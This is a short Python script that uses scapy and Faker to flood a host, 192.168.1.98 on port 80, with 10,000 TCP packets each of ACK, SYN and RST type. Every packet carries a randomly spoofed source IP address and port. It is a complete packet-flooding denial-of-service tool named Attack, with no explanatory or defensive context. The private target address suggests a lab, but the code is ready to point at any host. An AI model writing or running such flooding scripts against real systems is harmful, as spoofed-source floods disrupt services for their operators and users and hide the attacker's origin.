from scapy.all import IP, TCP, send
from faker import Faker
import random

fake = Faker()
def Attack(dst_ip, dst_port, flag, count):
    for i in range(count):
        src_ip = fake.ipv4()
        src_port = random.randint(1024, 65535)

        ip = IP(src=src_ip, dst=dst_ip)
        tcp = TCP(sport = src_port, dport=dst_port, flags=flag)
        packet = ip/tcp
        send(packet, verbose=False)
        print(f"Sent {flag} packet, total send {i+1} packtes")
#A = ACK, S=SYN, SA=SYN/ACK, R=RST, F=Fin, FA=FIN/ACK, PA=PUSH/ACK
Attack("192.168.1.98", 80, "A", 10000)
Attack("192.168.1.98", 80, "S", 10000)
Attack("192.168.1.98", 80, "R", 10000)
